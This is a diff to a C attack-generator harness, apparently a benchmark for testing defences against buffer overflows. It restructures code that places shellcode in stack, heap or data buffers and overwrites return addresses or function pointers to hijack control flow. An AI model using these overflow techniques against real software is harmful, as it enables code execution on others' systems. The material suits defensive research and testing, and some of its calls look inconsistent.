@@ -1,6 +1,7 @@
 #include <stdio.h>
 #include <string.h>
 #include <stdlib.h>
+#include <setjmp.h>
 
 #include "attack_generator.h"
 
@@ -55,6 +56,8 @@ void generate_payload() {
     fprintf(stderr, "malloc failed\n");
   }
 
+//  printf("buffer is %x\ntarget is %x\n", payload.buffer, payload.target_addr);
+
   int overflow_ptr = (int) payload.overflow_ptr;
   memcpy(temp_char_buffer, payload.contents, payload.size);
 
@@ -77,11 +80,19 @@ boolean is_attack_possible() {
   return TRUE;
 }
 
-int main() {  
+
+void perform_attack(void (*stack_func_ptr_param)()) {  
+
 
   char buf[BUFFER_SIZE];
 
   struct pointer_struct stack_indirect;
+
+  static struct pointer_struct bss_indirect = {"AAAAAAAA", &fooz};
+
+  struct jmp_struct stack_jmp_struct;
+  int val_struct;
+  val_struct = setjmp(stack_jmp_struct.env_buffer);
 
   struct pointer_struct* heap_indirect = (struct pointer_struct*) malloc(sizeof(struct pointer_struct));
 
@@ -92,73 +103,109 @@ int main() {
   heap_struct->func_ptr = &fooz;
 
   attack.technique = INDIRECT;
-  attack.code_ptr = RET_ADDR;
-  attack.location = BSS;
+  attack.code_ptr = STRUCT_FUNC_PTR_HEAP;
+  attack.location = STACK;
 
   payload.size = shellcode_no_noop_size;
 
-  if (attack.code_ptr == RET_ADDR) {
-    payload.target_addr = (void*) ((uintptr_t) (RET_ADDR_PTR) - 0x10);
-  } else if (attack.code_ptr == STRUCT_FUNC_PTR_STACK) {
-    payload.target_addr = (void*) &stack_struct.func_ptr;
-  } else if (attack.code_ptr == STRUCT_FUNC_PTR_HEAP) {
-    payload.target_addr = (void*) &heap_struct->func_ptr;
-  } else if (attack.code_ptr == STRUCT_FUNC_PTR_DATA) {
-    payload.target_addr = (void*) &data_struct.func_ptr;
+
+  // set the buffer to be used
+  switch(attack.location) {
+    case STACK:
+      if (attack.technique == DIRECT && attack.code_ptr == STRUCT_FUNC_PTR_STACK) {
+        payload.overflow_ptr = payload.buffer = stack_struct.buffer;
+        payload.target_addr = &stack_struct.func_ptr;
+      } else if (attack.technique == DIRECT) {
+        payload.overflow_ptr = payload.buffer = buf;
+        payload.target_addr = (void*) ((uintptr_t) (RET_ADDR_PTR) - 0x10);
+      } else {
+        payload.buffer = stack_indirect.buf;
+        payload.target_addr = &stack_indirect.mem_ptr;
+      }
+      break;
+
+    case HEAP:
+      if (attack.technique == DIRECT && attack.code_ptr == STRUCT_FUNC_PTR_HEAP) {
+        payload.overflow_ptr = payload.buffer = heap_struct->buffer;
+        payload.target_addr = &heap_struct->func_ptr;
+      } else if (attack.technique == DIRECT) {
+        payload.overflow_ptr = payload.buffer = malloc(BUFFER_SIZE);
+        payload.target_addr = (void*) ((uintptr_t) (RET_ADDR_PTR) - 0x10);
+      } else {
+        payload.buffer = heap_indirect->buf;
+        payload.target_addr = &heap_indirect->mem_ptr;
+      }
+      break;
+
+    case DATA:
+      if (attack.technique == DIRECT && attack.code_ptr == STRUCT_FUNC_PTR_DATA) {
+        payload.overflow_ptr = payload.buffer = data_struct.buffer;
+        payload.target_addr = &data_struct.func_ptr;
+      } else if (attack.technique == INDIRECT) {
+        payload.buffer = data_indirect.buf;
+        payload.target_addr = &data_indirect.mem_ptr;
+      } else {
+        exit(1);
+      }
+      payload.overflow_ptr = payload.buffer;
+      break;
   }
 
-  if (attack.code_ptr == STRUCT_FUNC_PTR_STACK) {
-    payload.buffer = payload.overflow_ptr = stack_struct.buffer;
+  // if the attack is indirect, set the overflow_ptr appropriately
+  if(attack.technique == INDIRECT) {
+    switch(attack.code_ptr) {
+      case RET_ADDR:
+        payload.overflow_ptr = (void*) ((uintptr_t) (RET_ADDR_PTR) - 0x10);
+        break;
+      case STRUCT_FUNC_PTR_STACK:
+        payload.overflow_ptr = &stack_struct.func_ptr;
+        break;
+      case STRUCT_FUNC_PTR_HEAP:
+        payload.overflow_ptr = &heap_struct->func_ptr;
+        break;
+      case STRUCT_FUNC_PTR_DATA:
+        payload.overflow_ptr = &data_struct.func_ptr;
+        break;
+      case FUNC_PTR_STACK_PARAM:
+        payload.overflow_ptr = &stack_func_ptr_param;
+        break;
+   }
   }
-  else if (attack.code_ptr == STRUCT_FUNC_PTR_HEAP) {
-    payload.buffer = payload.overflow_ptr = heap_struct->buffer;
+
+  payload.contents = shellcode_no_noop;
+
+  generate_payload(&fooz);
+
+
+  // if the attack is indirect, set the mem_ptr appropriate
+  if (attack.technique == INDIRECT && attack.location == STACK) {
+    *stack_indirect.mem_ptr = (int) payload.buffer;
+    printf("%x\n", *stack_indirect.mem_ptr);
   }
-  else if (attack.code_ptr == STRUCT_FUNC_PTR_DATA) {
-    payload.buffer = payload.overflow_ptr = data_struct.buffer;
-  }
-  else if (attack.location == STACK) {
-    if (attack.technique == DIRECT) {
-      payload.buffer = payload.overflow_ptr = buf;
-    } else if (attack.technique == INDIRECT) {
-      payload.buffer = stack_indirect.buf;
-      payload.overflow_ptr = ((uintptr_t) (RET_ADDR_PTR) - 0x10);
-      payload.target_addr = &stack_indirect.mem_ptr;
-    }
-  }
-  else if (attack.location == HEAP) {
-    if (attack.technique == DIRECT) {
-      payload.buffer = payload.overflow_ptr = malloc(100);
-    } else if (attack.technique == INDIRECT) {
-      payload.buffer = heap_indirect->buf;
-      payload.overflow_ptr = ((uintptr_t) (RET_ADDR_PTR) - 0x10);
-      payload.target_addr = &heap_indirect->mem_ptr;
-    }
-  }
-  else if (attack.location == DATA) {
-    if(attack.technique == INDIRECT) {
-      payload.buffer = data_indirect.buf;
-      payload.overflow_ptr = ((uintptr_t) (RET_ADDR_PTR) - 0x10);
-      payload.target_addr = &data_indirect.mem_ptr;
+
+
+  if (attack.technique == INDIRECT) {
+    switch (attack.code_ptr) {
+      case STRUCT_FUNC_PTR_STACK:
+        stack_struct.func_ptr();
+        break;
+      case STRUCT_FUNC_PTR_HEAP:
+        heap_struct->func_ptr();
+        break;
+      case STRUCT_FUNC_PTR_DATA:
+        data_struct.func_ptr();
+        break;
+      case FUNC_PTR_STACK_PARAM:
+        stack_func_ptr_param();
+        break;
     }
   }
 
   payload.contents = shellcode_no_noop;
 
-  generate_payload(&payload);
+  generate_payload(&fooz);
+}
 
-  if (attack.technique == INDIRECT) {
-    if (attack.location == STACK) {
-      *((int*) (stack_indirect.mem_ptr)) = (int) payload.buffer;
-      // done so that the compiler doesn't optimize away the write
-      printf("stack_mem_ptr val is %x\n", *stack_indirect.mem_ptr);
-    }
-  }
-
-  if (attack.code_ptr == STRUCT_FUNC_PTR_STACK) {
-    stack_struct.func_ptr();
-  } else if (attack.code_ptr == STRUCT_FUNC_PTR_HEAP) {
-    heap_struct->func_ptr();
-  } else if (attack.code_ptr == STRUCT_FUNC_PTR_DATA) {
-    data_struct.func_ptr();
-  }
+int main() {
+  perform_attack(&fooz);
 }
